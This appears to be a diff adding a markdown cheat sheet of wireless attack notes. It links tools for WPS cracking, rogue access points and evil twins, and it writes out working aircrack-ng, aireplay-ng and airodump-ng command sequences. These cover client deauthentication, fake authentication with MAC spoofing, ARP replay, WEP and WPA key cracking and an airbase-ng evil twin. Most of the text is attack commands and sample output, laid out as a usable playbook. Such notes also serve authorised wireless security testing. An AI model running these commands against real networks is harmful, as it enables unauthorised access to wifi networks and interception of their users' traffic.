@@ -1,0 +1,93 @@
+# wifi
+
+https://github.com/routerkeygen
+
+# harvest valuable info in wpa enterprise traffic
+Creap http://www.shellntel.com/blog/2015/9/23/assessing-enterprise-wireless-networks https://github.com/Shellntel/scripts.git
+https://github.com/securestate/eapeak
+
+# WPS
+tshark -i wlan1mon -Y 'wps.wifi_protected_setup_state == 2' # check if wps is enabled
+https://github.com/SilentGhostX/HT-WPS-Breaker (automates Piexiewps Reaver Bully Aircrack-ng)
+https://github.com/wiire/pixiewps
+http://www.devttys0.com/2014/10/reversing-d-links-wps-pin-algorithm/ (default wps pins)
+
+# rogue ap
+sensepost/mana hostapd-mana
+
+# wpa2 crack pass without AP
+http://n0where.net/wpa2-halfhandshake-crack/
+
+# wepbuster
+outil pour casser du wep automatiquement
+
+# bbox (bouygues)
+http://www.korben.info/les-bbox-de-bouygues-telecom-sont-toutes-piratables-facilement-en-plus.html
+
+# fern-wifi-cracker (blackarch)
+gui based wireless security auditing application that uses the aircrack-ng suite of tools
+
+# create an evil wireless access point
+http://www.offensive-security.com/kali-linux/kali-linux-evil-wireless-access-point/
+
+# aircrack
+* WPA
+airodump-ng -c 11 -w neuf --bssid 00:17:11:22:AB:CD mon
+aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 -D mon0
+aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap
+
+* WEP
+airmon-ng start wlan0 11
+ifconfig mon0 down
+macchanger -m mon0
+ESSID=
+BSSID=
+SRC= <- use my MAC or any random one, if fake auth fails maybe MAC whitelisting is in place
+ifconfig mon0 up
+airodump-ng -i -w blah -c 11 --bssid $BSSID mon0
+aireplay-ng -1 0 -e $ESSID -a $BSSID -h $SRC -D mon0
+// or
+aireplay-ng -1 6000 -o 1 -q 10 -e $ESSID -a $BSSID -h $SRC -D mon0 
+aireplay-ng -3 -a $BSSID -h $SRC -D mon0
+
+// skip fake auth if spoofing already associated client or see aireplay-ng -2 to replay ARP issued by associated client
+
+aircrack -w path/to/wordlist.dic blah*.ivs
+
+# fake auth OK looks like:
+12:33:17  Sending Authentication Request (Open System)
+
+12:33:19  Sending Authentication Request (Open System) [ACK]
+12:33:19  Authentication successful
+12:33:19  Sending Association Request [ACK]
+12:33:19  Association successful :-) (AID: 1)
+
+12:33:29  Sending keep-alive packet [ACK]
+12:33:39  Sending keep-alive packet [ACK]
+12:33:39  Got a deauthentication packet! (Waiting 3 seconds)
+
+12:33:42  Sending Authentication Request (Open System) [ACK]
+12:33:43  Authentication successful
+12:33:43  Sending Association Request [ACK]
+12:33:44  Association successful :-) (AID: 1)
+
+12:33:54  Sending keep-alive packet [ACK]
+12:34:04  Sending keep-alive packet [ACK]
+...
+
+# crack WEP key
+aircrack-ng -b 00:14:6C:7E:40:80 output*.cap
+or
+aircrack-ng -K -b 00:14:6C:7E:40:80 output*.cap # invokes the FMS/Korek method
+
+# other techniques to crack WEP
+http://ha.cker.ir/2013/06/how-to-hack-wifi-protected-with-wep/
+
+# evil twin
+airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 11 mon0
+
+iwconfig wlan0 txpower 27
+iwconfig wlan0 txpower 30
+
+# find connected ap on windows
+netsh wlan show all | more
